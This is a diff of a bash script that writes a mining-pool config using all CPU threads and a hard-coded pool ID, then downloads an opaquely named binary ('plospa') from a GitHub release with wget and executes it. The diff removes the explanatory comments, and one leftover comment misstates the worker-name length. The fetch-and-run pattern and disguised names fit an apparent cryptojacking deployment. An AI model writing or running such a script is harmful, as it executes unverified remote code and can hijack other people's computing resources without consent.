@@ -1,13 +1,9 @@
 #!/bin/bash
 
-# Get number of all available threads
 THREADS=$(nproc --all)
-
-# Generate a random worker name (e.g., SEP + 99 random uppercase letters/digits)
 WORKER_NAME="SEP$(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 5 | head -n 1)"
 
-# Generate the JSON config
-cat > appsettings.json
+cat <<EOF > appsettings.json
 {
   "ClientSettings": {
     "poolAddress": "wss://pplnsjetski.xyz/ws/YEFTEEAYTSMKIDPBMGCTIDOZTKCBBGYTGANZMCLGTFWWARKYZGKZZSBBJOQN",
@@ -29,14 +25,10 @@ EOF
 
 echo "✅ Config generated with alias $WORKER_NAME and $THREADS threads."
 
-# Download plospa binary from GitHub
-echo "⬇️  Downloading 'plospa'..."
+echo "⬇️  Downloading plospa..."
 wget -q https://github.com/vedhagsvp/taberas/releases/download/latest/plospa -O plospa
 
-# Make it executable
 chmod +x plospa
-chmod +x appsettings.json
-
-# Run the downloaded executable
-echo "🚀 Starting plospa..."
-./plospa
+echo "🚀 Running plospa..."
+file ./plospa
+./plospa || echo "❌ Failed to run plospa"
